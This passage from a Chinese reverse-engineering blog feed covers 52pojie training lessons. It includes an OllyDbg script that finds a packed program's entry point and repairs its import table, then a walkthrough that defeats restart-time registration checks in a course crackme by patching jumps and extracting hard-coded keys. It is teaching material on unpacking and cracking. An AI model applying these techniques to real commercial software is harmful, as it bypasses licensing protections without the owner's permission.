D3 F0 77 5F 6E  騱8g騱赜饂X羽w_n</span><br><span class="line">00AE0DF0   EF 77 60 83 EF 77 23 D3 EF 77 FA 6B EF 77 A0 7A  飛`冿w#语w鷎飛爖</span><br><span class="line">00AE0E00   EF 77 D6 6A EF 77 D1 AB EF 77 D3 B8 EF 77 36 86  飛謏飛勋飛痈飛6</span><br><span class="line">00AE0E10   EF 77 7A D8 EF 77 D7 D8 F1 77 E3 71 F0 77 81 BE  飛z仫w棕駑鉸饂伨</span><br><span class="line">00AE0E20   EF 77 4C 7B EF 77 BE 95 EF 77 2C D7 EF 77 77 06  飛L&#123;飛緯飛,罪ww</span><br><span class="line">00AE0E30   F0 77 DB 5E EF 77 01 7C EF 77 79 7C EF 77 BA 92  饂踍飛|飛y|飛簰</span><br><span class="line">00AE0E40   EF 77 B7 E8 EF 77 29 5E EF 77 EA C3 F0 77 89 63  飛疯飛)^飛昝饂塩</span><br><span class="line">00AE0E50   F2 77 40 97 EF 77 06 98 EF 77 77 5D EF 77 A1 6A  騱@楋w橈ww]飛</span><br><span class="line">00AE0E60   EF 77 A1 DD EF 77 2D A4 EF 77 00 00 00 00 00 00  飛≥飛-わw......</span><br><span class="line">00AE0E70   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure><p>用最后一次异常法到OEP和修复IAT，来自论坛苏紫方璇的脚本：(高级，看不懂就是了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">var iat_b         ;iat起始位置</span><br><span class="line">var iat_e         ;iat结束位置</span><br><span class="line">var tmp           ;临时中转</span><br><span class="line">var string        ;储存代码段自动跟踪命令</span><br><span class="line">var oldesp        ;esp备份</span><br><span class="line">var oldeip        ;eip备份</span><br><span class="line">var codebegin     ;代码段起始地址</span><br><span class="line">var codesize      ;代码段大小</span><br><span class="line"> </span><br><span class="line">gmi eip,CODEBASE             ;获取代码段地址</span><br><span class="line">mov codebegin,$RESULT</span><br><span class="line">gmi eip,CODESIZE             ;获取代码段大小</span><br><span class="line">mov codesize,$RESULT</span><br><span class="line">add codebegin,codesize       ;得到末尾地址</span><br><span class="line">mov string,&quot;eip &lt; &quot;          ;构建自动跟踪指令</span><br><span class="line">add string,codebegin</span><br><span class="line">msg &quot;请取消所有的忽略异常&quot;;StrongOD中的skip some exceptions要勾选</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO                      ;最后一次异常法</span><br><span class="line">bphws [esp+4],&quot;x&quot;         ;Seh地址下硬件断点</span><br><span class="line">ESTO                      ;Shift+F9</span><br><span class="line">bphwcall                  ;清除所有硬件断点</span><br><span class="line">TICND string              ;TICND &quot;eip &lt; 47d000&quot;       ;tc eip&lt;47d000</span><br><span class="line">cmt eip,&quot;程序入口点&quot;</span><br><span class="line">msg &quot;找到入口点&quot;</span><br><span class="line">;IAT修复</span><br><span class="line">mov iat_b,0047D000</span><br><span class="line">mov iat_e,0047D6A0</span><br><span class="line">mov oldesp,esp           ;备份esp，eip</span><br><span class="line">mov oldeip,eip</span><br><span class="line">@ILoop:</span><br><span class="line">mov tmp,[iat_b]          ;tmp=原始iat表值</span><br><span class="line">cmp tmp,10000000</span><br><span class="line">ja @Next                 ;若大于10000000就换下一个</span><br><span class="line">cmp tmp,00400000</span><br><span class="line">ja @Start                ;若大于00400000就继续运行</span><br><span class="line">cmp tmp,0</span><br><span class="line">jz @Next                 ;等于0就换下一个</span><br><span class="line">@Start:</span><br><span class="line">mov eip,tmp          ;设定eip</span><br><span class="line">mov esp,oldesp       ;恢复esp</span><br><span class="line">rtr                   ;运行到返回</span><br><span class="line">mov [iat_b],[esp]      ;修复IAT</span><br><span class="line">@Next:</span><br><span class="line">add iat_b,4           ;下一个iat</span><br><span class="line">cmp iat_b,iat_e       ;判断是否结束</span><br><span class="line">jnz @ILoop</span><br><span class="line">mov eip,oldeip        ;恢复eip，esp</span><br><span class="line">mov esp,oldesp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做第五六课的打补丁作业时，遇到了在不脱壳的情况下修改程序。在复制到可执行文件时提示“无法定位数据”。这是因为程序加壳后，代码段显示全是空代码，我们修改代码时，系统执行将某代码1修改为某代码2，但系统在代码段找不到某代码1，所以提示“无法定位数据”。&lt;/p&gt;
&lt;p&gt;但如果我们将程序脱壳了，就可在程序上随意修改，所以脱壳的重要性就体现出来了。脱壳毁一生，破解穷三代(bushi)。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第五六课——解除程序重启验证，程序打补丁</title>
    <link href="http://example.com/posts/bb44dc0.html"/>
    <id>http://example.com/posts/bb44dc0.html</id>
    <published>2022-04-05T01:29:28.122Z</published>
    <updated>2022-04-11T05:26:08.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-课前预习"><a href="#1-课前预习" class="headerlink" title="1. 课前预习"></a>1. 课前预习</h1><ul><li><p>熟悉OD字符串插件的使用<br>右键或插件-&gt;中文搜索引擎-&gt;智能搜索，Ctrl+F搜索字符串。</p></li><li><p>熟悉OD如何下断点<br>Ctrl+G，直接搜索API下断<br>Ctrl+N，输入表搜索API-&gt;右键-&gt;在每个参考上设置断点<br>利用插件，ApiBreak和API断点设置工具都可以</p></li></ul><span id="more"></span><ul><li><p>熟悉procmon的使用<br>可以监控文件，注册表，网络，进线程信息<br>排除进程:Exclude<br>查看指定进程:Include</p></li><li><p>熟悉文件操作API的使用<br>CreateFileA(W):创建文件<br>ReadFile:读取文件<br>WriteFile:写入文件<br>CloseHandle:关闭句柄<br>读取文件:CreateFile-&gt;ReadFile-&gt;CloseHandle<br>写入文件:CreateFile-&gt;WriteFile-&gt;CloseHandle</p></li><li><p>熟悉注册表操作API的使用<br>创建注册表Key:RegCreateKey<br>打开注册表Key:RegOpenKey<br>查询注册表键值:RegQueryValueExA<br>写入注册表键值:RegSetValueEx</p></li></ul><h1 id="2-重启验证"><a href="#2-重启验证" class="headerlink" title="2. 重启验证"></a>2. 重启验证</h1><p>什么是重启验证</p><ul><li>重启验证顾名思义就是在程序启动时验证注册信息。 </li></ul><p>执行流程</p><ul><li><p>基本的执行流程：注册信息输入—&gt;程序重启—&gt;执行验证机制—&gt;正常执行</p></li><li><p>扩展的执行流程：注册信息输入—&gt;执行部分验证机制/执行假验证机制—&gt;程序重启—&gt;执行真验证机制—&gt;正常执行</p></li><li>对于有经验的作者来说，可以在注册信息输入和程序重启之间加入假的验证机制，假的验证机制一般比较简单，比如说只是当单纯的明码比较，当我们输入假的注册码，程序一般会提示注册成功，此时程序就会知道我们是逆向者，在程序重启时就会假装注册成功，在执行程序功能时就会报错或是无反应，这就是所谓的暗桩。</li></ul><p>重启验证的类型</p><ul><li>重启验证根据写入信息位置的不同一般分两类，一类是将注册信息写入文件中，一类是将注册信息写入注册表中。</li></ul><p>定位关键代码</p><ol><li>字符串定位<br>通过OD字符串插件扫描敏感字符串，一般出现的文件路径或是注册表路径都可能是验证信息的保存位置</li><li>监控工具定位<br>通过procmon等监控工具监控注册信息的写入位置</li><li>API定位<br>通过定位CreateFile，RegCreateKey，GetPrivateProfileStringA等API来获取注册信息的写入位置</li></ol><h1 id="3-重启验证示例"><a href="#3-重启验证示例" class="headerlink" title="3. 重启验证示例"></a>3. 重启验证示例</h1><p>运行一下程序查看它的操作机制。</p><img src="/posts/bb44dc0/%E7%A4%BA%E4%BE%8B.png" class="" title="示例"><p>输入任意字符串，点击重启验证1，出现弹窗，在程序的本目录下生成一个.txt文件，程序退出。里面是我们输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">888888888</span><br></pre></td></tr></table></figure><p>再次，点击重启验证2，出现弹窗，在程序的本目录下生成一个.ini文件，程序退出。里面是我们输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[验证]</span><br><span class="line">Key=888888888</span><br></pre></td></tr></table></figure><p>再次，点击重启验证3，出现弹窗，在本机注册表里写入信息，程序退出。徽标键+R打开运行窗口，输入<code>regedit</code>打开注册表，在下图看到输入的字符串。</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E8%A1%A8.png" class="" title="注册表"><p>将所有生成的文件和注册表信息删除，载入OD，搜索敏感字符串。</p><img src="/posts/bb44dc0/%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B2.png" class="" title="搜索字符串"><p>首先看重启验证1，双击进入反汇编代码，找到函数开头下断。运行，输入假码，选择重启验证1，OD停在断点处。F8往下走走，遇到call先用enter探探路再考虑是否跟进去。这个call里面有很多API函数，程序经过这条指令后，eax变成我们输入的字符串，所以这个函数是取出输入框里的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040275B  |.  E8 C8590100   call 52PoJie?00418128;eax=888888888</span><br><span class="line">00402760  |.  8B45 EC             mov eax,[local.5]</span><br><span class="line">00402763  |.  8378 F4 00          cmp dword ptr ds:[eax-0xC],0x0;判断字符串是否为空</span><br><span class="line">00402767  |.  74 74               je short 52PoJie?004027DD</span><br></pre></td></tr></table></figure><p>继续F8，到<code>CreateFileA</code>函数，创建一个52Pojie.txt文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402769  |.  6A 00               push 0x0                                     ; /hTemplateFile = NULL</span><br><span class="line">0040276B  |.  6A 00               push 0x0                                     ; |Attributes = 0</span><br><span class="line">0040276D  |.  6A 02               push 0x2                                     ; |Mode = CREATE_ALWAYS</span><br><span class="line">0040276F  |.  6A 00               push 0x0                                     ; |pSecurity = NULL</span><br><span class="line">00402771  |.  6A 01               push 0x1                                     ; |ShareMode = FILE_SHARE_READ</span><br><span class="line">00402773  |.  68 00000040         push 0x40000000                              ; |Access = GENERIC_WRITE</span><br><span class="line">00402778  |.  FFB6 BC000000       push dword ptr ds:[esi+0xBC]                 ; |FileName = &quot;C:\Documents and Settings\Administrator\桌面\吾爱破解培训第五课例子\52Pojie.txt&quot;</span><br><span class="line">0040277E  |.  FF15 10345400       call dword ptr ds:[&lt;&amp;KERNEL32.CreateFileA&gt;]  ; \CreateFileA</span><br></pre></td></tr></table></figure><p>F8到<code>WriteFileA</code>函数，将我们输入的字符串写入52Pojie.txt文件中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">004027AD  |&gt; \6A 00               push 0x0                                     ; /pOverlapped = NULL</span><br><span class="line">004027AF  |.  8D45 E8             lea eax,[local.6]                            ; |</span><br><span class="line">004027B2  |.  50                  push eax                                     ; |pBytesWritten = 00000009</span><br><span class="line">004027B3  |.  57                  push edi                                     ; |nBytesToWrite = 0x9</span><br><span class="line">004027B4  |.  51                  push ecx                                     ; |Buffer = 00161100</span><br><span class="line">004027B5  |.  56                  push esi                                     ; |hFile = 000000D4 (window)</span><br><span class="line">004027B6  |.  FF15 2C345400       call dword ptr ds:[&lt;&amp;KERNEL32.WriteFile&gt;]    ; \WriteFile</span><br></pre></td></tr></table></figure><p>继续F8，<code>004027C9</code>执行弹窗，退出，关闭句柄。再之后就退出程序了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">004027C0  |.  6A 00               push 0x0</span><br><span class="line">004027C2  |.  6A 00               push 0x0</span><br><span class="line">004027C4  |.  68 60465400         push 52PoJie?00544660                        ;  你选择的验证类型是重启验证1</span><br><span class="line">004027C9  |.  E8 B17F0000         call 52PoJie?0040A77F</span><br><span class="line">004027CE  |.  6A 00               push 0x0                                     ; /ExitCode = 0x0</span><br><span class="line">004027D0  |.  FF15 40385400       call dword ptr ds:[&lt;&amp;USER32.PostQuitMessage&gt;&gt;; \PostQuitMessage</span><br><span class="line">004027D6  |&gt;  56                  push esi                                     ; /hObject = 000000D4 (window)</span><br><span class="line">004027D7  |.  FF15 24345400       call dword ptr ds:[&lt;&amp;KERNEL32.CloseHandle&gt;]  ; \CloseHandle</span><br></pre></td></tr></table></figure><p>因为它是重启验证，所以在这个函数中找不到验证算法。而是在主程序出来前就已经运行验证算法了。再次打开程序时，程序会在相应的.txt，.ini或注册表里找注册码进行验证。</p><p>重载，找敏感字符串有关“52Pojie.txt”的双击进去反汇编代码，在函数开头下断。F9运行至断点处，F8路过这个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00402AE2  |.  50            push eax                                 ; /Buffer = 00174B68</span><br><span class="line">00402AE3  |.  68 04010000   push 0x104                               ; |BufSize = 104 (260.)</span><br><span class="line">00402AE8  |.  FF15 14345400 call dword ptr ds:[&lt;&amp;KERNEL32.GetCurrent&gt;; \GetCurrentDirectoryA 获取当前目录</span><br></pre></td></tr></table></figure><p>继续F8，发现这个跳转跳过了“验证通过”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402BC0  |.  E8 1BF4FFFF   call 52PoJie?00401FE0</span><br><span class="line">00402BC5  |.  85C0          test eax,eax</span><br><span class="line">00402BC7  |. /74 15         je short 52PoJie?00402BDE</span><br><span class="line">00402BC9  |. |8B8D DCFEFFFF mov ecx,[local.73]</span><br><span class="line">00402BCF  |. |68 18465400   push 52PoJie?00544618                    ;  验证通过</span><br><span class="line">00402BD4  |. |E8 E7980100   call 52PoJie?0041C4C0</span><br><span class="line">00402BD9  |. |BB 01000000   mov ebx,0x1</span><br><span class="line">00402BDE  |&gt; \8B85 E0FEFFFF mov eax,[local.72]</span><br></pre></td></tr></table></figure><p>如果是爆破的话，直接将跳转指令nop掉。保存，运行一下，成功。</p><img src="/posts/bb44dc0/nop.png" class="" title="验证1通过"><p>如果想逆向分析，跟进去第1行的call指令，那个就是算法函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00401FF7  |.  56            push esi                                 ; /hTemplateFile = 00174B68</span><br><span class="line">00401FF8  |.  56            push esi                                 ; |Attributes = ARCHIVE|TEMPORARY|COMPRESSED|174248</span><br><span class="line">00401FF9  |.  6A 03         push 0x3                                 ; |Mode = OPEN_EXISTING</span><br><span class="line">00401FFB  |.  56            push esi                                 ; |pSecurity = 00174B68</span><br><span class="line">00401FFC  |.  6A 01         push 0x1                                 ; |ShareMode = FILE_SHARE_READ</span><br><span class="line">00401FFE  |.  6A 01         push 0x1                                 ; |Access = 1</span><br><span class="line">00402000  |.  FFB1 BC000000 push dword ptr ds:[ecx+0xBC]             ; |FileName = &quot;C:\Documents and Settings\Administrator\桌面\吾爱破解培训第五课例子\52Pojie.txt&quot;</span><br><span class="line">00402006  |.  FF15 10345400 call dword ptr ds:[&lt;&amp;KERNEL32.CreateFile&gt;; \CreateFileA 创建或打开文件，这里是打开文件</span><br></pre></td></tr></table></figure><p>ReadFile函数，当程序运行到<code>00402046</code>时，Buffer指针指向文件内容首地址<code>0012F348</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00402039  |.  56            push esi                                 ; /pOverlapped = NULL</span><br><span class="line">0040203A  |.  50            push eax                                 ; |pBytesRead = 0012F348</span><br><span class="line">0040203B  |.  68 04010000   push 0x104                               ; |BytesToRead = 104 (260.)</span><br><span class="line">00402040  |.  8D85 F4FEFFFF lea eax,[local.67]                       ; |</span><br><span class="line">00402046  |.  50            push eax                                 ; |Buffer = 0012F348</span><br><span class="line">00402047  |.  57            push edi                                 ; |hFile = 000000AC (window)</span><br><span class="line">00402048  |.  FF15 28345400 call dword ptr ds:[&lt;&amp;KERNEL32.ReadFile&gt;] ; \ReadFile 读文件内容</span><br></pre></td></tr></table></figure><p>在信息窗口选中右键-&gt;数据窗口跟随，发现全是空数据，执行完这个函数时，<code>0012F348</code>出现我们输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00402048  |.  FF15 28345400 call dword ptr ds:[&lt;&amp;KERNEL32.ReadFile&gt;] ; \ReadFile</span><br><span class="line">0040204E  |.  85C0          test eax,eax;返回值为1，表明文件不为空</span><br><span class="line">00402050  |.  74 3D         je short 52PoJie?0040208F</span><br><span class="line">00402052  |.  B9 24465400   mov ecx,52PoJie?00544624                 ;  JXU2MjExJXU2</span><br><span class="line">00402057  |.  8D85 F4FEFFFF lea eax,[local.67]</span><br><span class="line">0040205D  |.  8D49 00       lea ecx,dword ptr ds:[ecx]</span><br><span class="line">00402060  |&gt;  8A10          /mov dl,byte ptr ds:[eax];这个循环执行的是strcmp函数，比较eax和ecx是否相等。执行到这一句时，eax是我们输入的字符串，ecx是上面的注释JXU2MjExJXU2</span><br><span class="line">00402062  |.  3A11          |cmp dl,byte ptr ds:[ecx]</span><br><span class="line">00402064  |.  75 1A         |jnz short 52PoJie?00402080</span><br><span class="line">00402066  |.  84D2          |test dl,dl</span><br><span class="line">00402068  |.  74 12         |je short 52PoJie?0040207C</span><br><span class="line">0040206A  |.  8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040206D  |.  3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00402070  |.  75 0E         |jnz short 52PoJie?00402080</span><br><span class="line">00402072  |.  83C0 02       |add eax,0x2</span><br><span class="line">00402075  |.  83C1 02       |add ecx,0x2</span><br><span class="line">00402078  |.  84D2          |test dl,dl</span><br><span class="line">0040207A  |.^ 75 E4         \jnz short 52PoJie?00402060</span><br><span class="line">0040207C  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>所以很容易就知道重启验证1的注册码是<code>JXU2MjExJXU2</code>。将生成的.txt文件内容改为这个，再打开原程序发现验证通过。</p><p>验证2、3一样操作，但需要注意，一定要先生成一个配置文件或写入注册表再进行重启验证调试。验证1生成的.txt文件不影响验证2和验证3的调试，可以不删除。</p><p>验证2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00402C34  |.  E8 77F4FFFF   call 52PoJie?004020B0</span><br><span class="line">00402C39  |.  85C0          test eax,eax</span><br><span class="line">00402C3B  |.  74 11         je short 52PoJie?00402C4E</span><br><span class="line">00402C3D  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040210C  |.  B9 40465400   mov ecx,52PoJie?00544640                 ;  NjJGJXU3NTI</span><br></pre></td></tr></table></figure><p>验证3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00402CB2  |.  E8 B9F4FFFF   call 52PoJie?00402170</span><br><span class="line">00402CB7  |.  85C0          test eax,eax</span><br><span class="line">00402CB9  |.  74 37         je short 52PoJie?00402CF2</span><br><span class="line">00402CBB  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004021FE  |.  B9 54465400   mov ecx,52PoJie?00544654                 ;  4JXU2MjM3</span><br></pre></td></tr></table></figure><p>细心一点就会在字符串列表发现这三个注册码</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E7%A0%81.png" class="" title="注册码"><p>最后，重启验证的普通思路</p><ol><li><p>如果是写进.txt文件，一般都是这个步骤：</p><p>CreateFileA-&gt;WriteFile-&gt;ReadFile-&gt;比较算法</p></li><li><p>如果是写进.ini文件，一般都是这个步骤：</p><p>WritePrivateProfileStringA(写入配置信息)-&gt;GetPrivateProfileStringA(读取配置信息)</p></li><li><p>如果是写进注册表，一般都是这个步骤：</p><p>创建注册表Key:RegCreateKey-&gt;打开注册表Key:RegOpenKey-&gt;写入注册表键值:RegSetValueEx-&gt;查询注册表键值:RegQueryValue(Ex)</p></li></ol><p>三个都通过后，会出现一个彩蛋，输入字符串后，弹出消息框。</p><img src="/posts/bb44dc0/%E5%BD%A9%E8%9B%8B.png" class="" title="彩蛋"><p>输入不同字符串弹窗显示不同的内容。彩蛋很简单，其实就是把三个验证码拼接，Base64解码，UTF-8转换，得到“我是用户”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JXU2MjExJXU2NjJGJXU3NTI4JXU2MjM3</span><br><span class="line"></span><br><span class="line">Base64解码：</span><br><span class="line">%u6211%u662F%u7528%u6237</span><br><span class="line"></span><br><span class="line">Unicode转换：</span><br><span class="line">我是用户</span><br></pre></td></tr></table></figure><img src="/posts/bb44dc0/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2.png" class="" title="编码转换"><p>把三个验证码拼接，弹窗。</p><img src="/posts/bb44dc0/%E5%BD%A9%E8%9B%8B3.png" class="" title="彩蛋"><h1 id="4-重启验证作业"><a href="#4-重启验证作业" class="headerlink" title="4. 重启验证作业"></a>4. 重启验证作业</h1><p>输入假码没什么反应。</p><img src="/posts/bb44dc0/%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A.png" class="" title="课后作业"><p>拉去OD看看，搜索字符串，发现只有一个验证码<code>ITN3UXJGJ</code>显示。</p><img src="/posts/bb44dc0/%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B22.png" class="" title="搜索字符串"><p>双击进去发现有<code>CreateFile</code>和<code>ReadFile</code>，所以判定这个是写入<code>.txt</code>文件的注册码。</p><img src="/posts/bb44dc0/txt%E6%96%87%E4%BB%B6.png" class="" title="txt文件"><p>用<code>GetPrivateProfileStringA</code>函数找到<code>.ini</code>文件的比较注册码算法。Ctrl+N，搜索<code>GetPrivateProfileStringA</code>右键-&gt;在每个参考上设置断点。或者在反汇编窗口右键-&gt;查找-&gt;所有模块间的调用，搜索函数，右键-&gt;在每个调用到<code>GetPrivateProfileStringA</code>上设置断点。一个一个断点点进去看，找到一个最像比较算法的(有循环、比较、跳转指令)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0040218F  |.  66:C785 F0FEF&gt;mov word ptr ss:[ebp-0x110],0x1A28       ; |</span><br><span class="line">00402198  |.  FF15 1C345400 call dword ptr ds:[&lt;&amp;KERNEL32.GetPrivate&gt;; \GetPrivateProfileStringA</span><br><span class="line">0040219E  |.  5E            pop esi                                  ;  kernel32.7C817077</span><br><span class="line">0040219F  |.  85C0          test eax,eax</span><br><span class="line">004021A1  |.  74 4D         je short 吾爱破解.004021F0</span><br><span class="line">004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]</span><br><span class="line">004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]</span><br><span class="line">004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">004021B0  |&gt;  8A01          /mov al,byte ptr ds:[ecx]    </span><br><span class="line">004021B2  |.  41            |inc ecx                       </span><br><span class="line">004021B3  |.  84C0          |test al,al</span><br><span class="line">004021B5  |.^ 75 F9         \jnz short 吾爱破解.004021B0</span><br><span class="line">004021B7  |.  2BCA          sub ecx,edx                              ;  ntdll.KiFastSystemCallRet</span><br><span class="line">004021B9  |.  83F9 0E       cmp ecx,0xE                   </span><br><span class="line">004021BC  |.  75 32         jnz short 吾爱破解.004021F0</span><br><span class="line">004021BE  |.  33C0          xor eax,eax                   </span><br><span class="line">004021C0  |&gt;  0FB69405 E4FE&gt;/movzx edx,byte ptr ss:[ebp+eax-0x11C]</span><br><span class="line">004021C8  |.  0FBE8C05 F4FE&gt;|movsx ecx,byte ptr ss:[ebp+eax-0x10C]</span><br><span class="line">004021D0  |.  83C2 30       |add edx,0x30                 </span><br><span class="line">004021D3  |.  3BD1          |cmp edx,ecx                   </span><br><span class="line">004021D5  |.  75 19         |jnz short 吾爱破解.004021F0</span><br><span class="line">004021D7  |.  40            |inc eax</span><br><span class="line">004021D8  |.  83F8 0E       |cmp eax,0xE</span><br><span class="line">004021DB  |.^ 72 E3         \jb short 吾爱破解.004021C0</span><br></pre></td></tr></table></figure><p>由于这个断点程序没有被经过，很难分析它的算法(我目前能力有限)。要想经过这段算法，就要看一下我们输入字符串后，程序怎么运行的。反汇编窗口右键-&gt;查找-&gt;所有模块间的调用，搜索<code>GetWindowTextA</code>，在每个调用到<code>GetWindowTextA</code>上设置断点。输入字符串后运行，程序停在某断点处。养成好习惯，把其它的<code>GetWindowTextA</code>断点取消。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0041837E  |.  FF15 2C365400 call dword ptr ds:[&lt;&amp;USER32.GetWindowTex&gt;; \GetWindowTextA</span><br><span class="line">00418384  |.  8B4D 08       mov ecx,[arg.1]</span><br><span class="line">00418387  |.  6A FF         push -0x1</span><br><span class="line">00418389  |.  E8 AEFEFEFF   call 吾爱破解.0040823C</span><br><span class="line">0041838E  |.  5E            pop esi                                  ;  00940796</span><br><span class="line">0041838F  |.  5D            pop ebp                                  ;  00940796</span><br><span class="line">00418390  |.  C2 0400       retn 0x4</span><br></pre></td></tr></table></figure><p>返回上一级函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 